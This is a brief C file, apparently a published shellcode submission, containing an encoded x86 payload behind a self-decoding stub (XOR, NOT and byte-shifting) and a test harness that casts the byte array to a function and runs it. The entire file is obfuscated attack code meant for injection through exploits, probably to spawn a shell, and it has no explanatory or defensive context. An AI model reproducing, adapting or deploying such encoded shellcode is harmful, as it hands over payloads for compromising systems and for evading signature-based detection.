// Decoder shellcode
// Author: buffered4ever
// 15-03-2019

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x26\x5e\x31\xc9\x31\xc0\x31\xdb\xb0\x01\xb1\x19\x8d\x3e\x8a\x1c\x06\x80\xf3\xaa\x74\x07\x88\x1c\x06\x04\x02\xeb\xf1\xf6\x17\x80\x07\x04\x47\xe2\xf8\xeb\x05\xe8\xd5\xff\xff\xff\xd2\xe9\xb3\x31\x95\x7e\x90\x31\x9b\x7e\xd4\x0b\x9a\xd0\x20\x19\x7a\x8b\xb0\xd0\x22\xf9\xf8\x9c\x83\xaa";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

